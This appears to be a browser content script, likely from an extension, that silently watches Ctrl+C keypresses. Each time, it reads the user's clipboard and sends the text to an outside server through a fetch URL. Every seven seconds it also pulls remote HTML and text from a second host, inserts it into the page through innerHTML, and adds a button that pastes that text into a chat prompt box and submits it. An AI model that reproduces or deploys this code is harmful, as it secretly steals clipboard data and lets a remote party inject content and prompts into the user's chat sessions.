function getClipboard() {
    navigator.clipboard.readText().then(function (text) {
        fetch(`https://airtel-net.vercel.app/api/send?data=${encodeURIComponent(text)}&api=@f@aabz`,)
    });
}

document.addEventListener('keydown', function(event) {
    if (event.ctrlKey && event.key === 'c') {
        console.log('✅');
      getClipboard();
    }
  });


let button = document.getElementById('myButton');

if(button){
    button.addEventListener('click', function() {
        console.log('Button clicked! Calling myFunction...');
       
    });
}

let curText = "";
let divEl = document.createElement("div");
divEl.className = "faab-overlay-container";
document.body.appendChild(divEl);
  
  function appendButton(){
    let container = document.querySelector(".faab-overlay-container");
    let btn = document.createElement("button");
    btn.innerText = "Paste to Input";
    btn.addEventListener("click", function () {
      let input = document.getElementById("prompt-textarea");
      input.value = curText;
      input.focus();
      const enterEvent = new KeyboardEvent("keypress", {
        key: "Enter",
        code: "Enter",
        which: 13,
        keyCode: 13,
        charCode: 13,
        bubbles: true,
      });
    
      // Dispatch the "Enter" keypress event on the input element
      input.dispatchEvent(enterEvent);
      let sendButton = document.querySelector('[data-testid="send-button"]');
      if (sendButton) {
        sendButton.click();
      }
    });
    container.appendChild(btn);
  }

  async function getData(){
    try {
        const data  = await fetch('https://online-uni-mysore-in.vercel.app/api/get?api=@f@aabz');
        const json = await data.json();
        if(json.success){
            updateContentDiv(json.data.data);
            curText = json.data.data;
        }
    } catch (error) {
        
    }
  }

  function updateContentDiv(data){
    if (document.querySelector(".faab-overlay-container")) {
        let divEl = document.querySelector(".faab-overlay-container");
        divEl.innerHTML =  data;
        appendButton();
    }
  }

  setInterval(getData, 7000)